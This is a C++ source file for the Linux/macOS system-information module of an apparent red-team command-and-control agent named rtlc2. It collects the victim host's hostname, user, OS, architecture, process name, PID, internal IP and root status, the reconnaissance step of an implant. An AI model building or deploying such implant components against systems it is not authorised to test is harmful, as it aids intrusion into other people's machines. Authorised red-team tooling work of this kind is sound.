#ifndef RTLC2_WINDOWS

#include "agent.h"
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <cstring>
#include <string>
#include <fstream>

#ifdef RTLC2_MACOS
#include <sys/sysctl.h>
#endif

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h>

namespace rtlc2 {
namespace modules {

SystemInfo GetSystemInfo() {
    SystemInfo info;

    // Hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    info.hostname = hostname;

    // Username
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        info.username = pw->pw_name;
    } else {
        char* user = getenv("USER");
        info.username = user ? user : "unknown";
    }

    // OS and arch
    struct utsname uts;
    if (uname(&uts) == 0) {
#ifdef RTLC2_MACOS
        info.os_name = std::string("macOS ") + uts.release;
#else
        info.os_name = std::string("Linux ") + uts.release;
#endif
        info.arch = uts.machine;
    }

    // Process name
    char proc_name[256] = {0};
#ifdef RTLC2_LINUX
    std::ifstream comm("/proc/self/comm");
    if (comm.is_open()) {
        std::getline(comm, info.process_name);
    }
#else
    info.process_name = "rtlc2-agent";
#endif

    // PID
    info.pid = static_cast<int>(getpid());

    // Internal IP
    struct ifaddrs* ifaddr;
    if (getifaddrs(&ifaddr) == 0) {
        for (struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr) continue;
            if (ifa->ifa_addr->sa_family == AF_INET) {
                char ip[INET_ADDRSTRLEN];
                struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
                inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
                std::string ip_str(ip);
                if (ip_str != "127.0.0.1") {
                    info.internal_ip = ip_str;
                    break;
                }
            }
        }
        freeifaddrs(ifaddr);
    }

    // Integrity level
    if (getuid() == 0) {
        info.integrity = "high";
    } else {
        info.integrity = "medium";
    }

    return info;
}

} // namespace modules
} // namespace rtlc2

#endif // !RTLC2_WINDOWS
